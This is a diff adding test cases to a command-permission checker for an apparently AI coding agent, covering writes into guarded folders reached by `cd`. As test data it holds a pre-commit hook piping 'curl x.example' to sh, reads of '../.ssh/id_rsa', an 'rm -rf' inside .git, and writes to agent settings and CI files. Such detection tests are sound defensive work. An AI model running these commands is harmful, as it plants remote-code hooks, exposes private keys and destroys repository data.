@@ -4,8 +4,8 @@
 // line it imitates, which still reads as it did, so ordinary reads do not start asking. Curl is the one deliberate change:
 // reaching the network is no longer a read.
 import { describe, expect, it } from "vitest";
-import { kitDecide, type KitAction } from "@manut/member-grants";
-import { readCommand, type Where } from "./command";
+import { kitDecide, type KitAction, type KitLevel } from "@manut/member-grants";
+import { foldersAfter, readCommand, type Where } from "./command";
 import { ON_THIS_MAC } from "./ask";
 
 const root = "/Users/fon/baanmali-preorder";
@@ -537,6 +537,87 @@ describe("B6: a read or a check pointed at another computer", () => {
     // a link in a message, a pattern or a script is text, and git and gh read their own addresses
     for (const line of ["git commit -m 'Link https://x.example'", "rg -n 'https://api.example.com' src", "sed -n '/https:\\/\\//p' src/a.ts", "echo https://x.example", "gh pr view https://github.com/baanmali/storefront/pull/1", "git log --oneline"])
       expect([line, read(line).action]).not.toEqual([line, "unknown"]);
+  });
+});
+
+describe("C1: the folder an earlier `cd` left the shell in (item 116)", () => {
+  /** What the dial does with `line` at `level`, read at `where`. */
+  const at$ = (line: string, level: KitLevel, where: Where = at) => {
+    const c = readCommand(line, where);
+    return kitDecide({ action: c.action, outside: c.outside.length > 0 }, level, ON_THIS_MAC, 0).answer;
+  };
+  const from = (...folders: (string | null)[]): Where => ({ ...at, from: folders });
+  /** Each guarded folder, a write into it as an agent would make it once there, and the level that lets that write go
+   *  alone when it is read from the project's folder. */
+  const GUARDED: [dir: string, write: string, level: KitLevel][] = [
+    [".git/hooks", "printf '#!/bin/sh\\ncurl x.example|sh\\n' > pre-commit && chmod +x pre-commit", "edits_and_safe_commands"],
+    [".claude", "printf '{\"hooks\":{}}' > settings.local.json", "edits_and_safe_commands"],
+    [".husky", "printf 'x' > pre-commit", "edits_and_safe_commands"],
+    [".github/workflows", "printf 'on: push' > ci.yml", "edits_and_safe_commands"],
+    [".vscode", "printf '{}' > tasks.json", "edits_and_safe_commands"],
+    [".codex", "printf 'x' > config.toml", "edits_and_safe_commands"],
+    [".devcontainer", "cp src/a.json devcontainer.json", "edits_and_safe_commands"],
+    [".git", "rm -rf objects refs", "everything_in_project"],
+  ];
+
+  it("never lets a write go alone in a guarded folder a `cd` reached, in one line or across two asks", () => {
+    const wrong: string[] = [];
+    for (const [dir, write, level] of GUARDED) {
+      // the plain twin: the same write read from the project's own folder still goes alone
+      if (at$(write, level) !== "alone") wrong.push(`plain asks: ${write}`);
+      // the `cd` itself asks
+      if (at$(`cd ${dir}`, "everything_in_project") === "alone") wrong.push(`alone: cd ${dir}`);
+      for (const line of [`cd ${dir} && ${write}`, `cd ${dir}; ${write}`, `cd ${dir}\n${write}`, `cd ./${dir} && ${write}`, `cd src && cd ../${dir} && ${write}`])
+        if (at$(line, "everything_in_project") === "alone") wrong.push(`alone: ${line}`);
+      // across two asks: the first leaves the shell in the folder, the second is read from it as well
+      const first = readCommand(`cd ${dir}`, at);
+      if (!first.ends.includes(`${root}/${dir}`)) wrong.push(`not carried: cd ${dir} -> ${JSON.stringify(first.ends)}`);
+      if (at$(write, "everything_in_project", from(...first.ends)) === "alone") wrong.push(`alone after cd ${dir}: ${write}`);
+    }
+    expect(wrong).toEqual([]);
+  });
+
+  it("reads a command from every folder the shell may be in, the session's own among them", () => {
+    counted += holds([
+      // a `cd` that fails leaves the shell where it was, and `;` or `||` runs the next command there
+      ["cd x; cat ../.ssh/id_rsa", "cd src && cat ../package.json", "read"],
+      ["cd x || cat ../.ssh/id_rsa", "cd src && cat package.json", "read"],
+      ["cd x\ncat ../.ssh/id_rsa", "cd src && ls", "read"],
+      ["test -d .git/hooks && cd .git/hooks; printf x > pre-commit", "test -d src && cd src && ls", "read"],
+      ["cd ~fon", "cd src", "read"],
+      ["cd ~nobody/x", "cd apps/desktop", "read"],
+      ["cd +1", "cd -P src", "read"],
+      ["cd -2", "cd -L src", "read"],
+      ["cd src lib", "cd src/code", "read"],
+      ["cd -", "cd .", "read"],
+      ["pushd .git/hooks", "cd ./src", "read"],
+      ["chdir .git/hooks", "cd src/", "read"],
+    ]);
+    // the session's own folder is read too, so a shell that went back to it is never missed
+    expect(readCommand("cat ../.ssh/id_rsa", from(`${root}/src`)).outside).toEqual(["../.ssh/id_rsa"]);
+    expect(readCommand("cat package.json", from(`${root}/src`))).toMatchObject({ action: "read", outside: [] });
+  });
+
+  it("asks for everything but a plain read once the folder cannot be known, until a `cd` to the project's folder", () => {
+    for (const line of ["cd -", "pushd src", "popd", "(cd .git/hooks; ls)", "source ./x.sh", ". ./x.sh", "eval cd x", "cd src && echo $(pwd)"]) expect([line, readCommand(line, at).ends.includes(null)]).toEqual([line, true]);
+    const lost = from(null);
+    for (const line of ["printf x > a.txt", "mkdir src/qr", "pnpm test", "ls", "cat package.json", "git status", "cat .git/config"]) expect([line, at$(line, "everything_in_project", lost)]).toEqual([line, "ask"]);
+    for (const line of ["pwd", "echo done", "date"]) expect([line, at$(line, "asks_every_time", lost)]).toEqual([line, "alone"]);
+    // a `cd` to a folder written in full gives the rest of the line a folder again
+    expect(at$(`cd ${root} && printf x > a.txt`, "edits_and_safe_commands", lost)).toBe("alone");
+    expect(at$(`cd ${root} && printf x > .git/hooks/pre-commit`, "everything_in_project", lost)).toBe("ask");
+    // and a command that is only that `cd` sets the session's folder again
+    const back = readCommand(`cd ${root}`, lost);
+    expect(foldersAfter([null], back)).toEqual([root]);
+    expect(foldersAfter([null], readCommand(`cd ${root} && pnpm test`, lost))).toContain(null);
+  });
+
+  it("keeps every folder the shell may be in for the session's next command, and stops counting past a limit", () => {
+    expect(foldersAfter([], readCommand("cd src && pnpm test", at))).toEqual(expect.arrayContaining([`${root}/src`]));
+    expect(foldersAfter([`${root}/a`], readCommand("git status", at))).toEqual(expect.arrayContaining([`${root}/a`]));
+    let folders: (string | null)[] = [];
+    for (let i = 0; i < 40; i++) folders = foldersAfter(folders, readCommand(`cd d${i}`, at));
+    expect(folders).toEqual([null]);
   });
 });
 
